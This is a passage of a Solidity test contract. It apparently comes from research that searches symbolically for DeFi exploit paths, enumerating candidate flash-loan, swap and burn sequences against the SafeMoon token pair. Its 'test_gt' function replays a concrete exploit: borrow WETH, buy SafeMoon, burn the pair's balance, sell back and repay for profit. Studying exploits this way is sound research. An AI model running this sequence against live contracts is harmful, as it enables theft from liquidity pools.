    function check_cand115(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand116(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        swap_pair_attacker_weth_safemoon(amt7, amt8);
        swap_safemoon_attacker_weth_safemoon(amt9, amt10);
        payback_safemoon_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand117(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        swap_safemoon_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand118(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_safemoon_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand119(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_safemoon_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand120(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        swap_pair_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand121(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        swap_safemoon_attacker_safemoon_weth(amt6, amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand122(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand123(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        swap_pair_attacker_weth_safemoon(amt7, amt8);
        swap_safemoon_attacker_weth_safemoon(amt9, amt10);
        payback_safemoon_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand124(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        swap_safemoon_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand125(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        swap_safemoon_attacker_safemoon_weth(amt6, amt7);
        swap_safemoon_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand126(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        swap_pair_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand127(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand128(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand129(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        swap_safemoon_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand130(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_safemoon_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand131(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        swap_safemoon_attacker_weth_safemoon(amt7, amt8);
        swap_pair_attacker_weth_safemoon(amt9, amt10);
        payback_safemoon_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand132(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        swap_pair_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand133(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand134(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        swap_safemoon_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand135(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        swap_safemoon_attacker_weth_safemoon(amt7, amt8);
        swap_pair_attacker_weth_safemoon(amt9, amt10);
        payback_safemoon_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        borrow_weth_owner(1000 ether);
        printBalance("After step0 ");
        swap_safemoon_attacker_weth_safemoon(800 * 1e18, 0);
        printBalance("After step1 ");
        burn_safemoon_pair(
            safemoon.balanceOf(safemoon.uniswapV2Pair()) - 1000000000
        );
        printBalance("After step2 ");
        swap_safemoon_attacker_safemoon_weth(
            safemoon.balanceOf(address(attacker)),
            0
        );
        printBalance("After step3 ");
        payback_weth_owner(1000 ether);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_safemoon_attacker_safemoon_weth(amt4, amt5);
        payback_weth_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
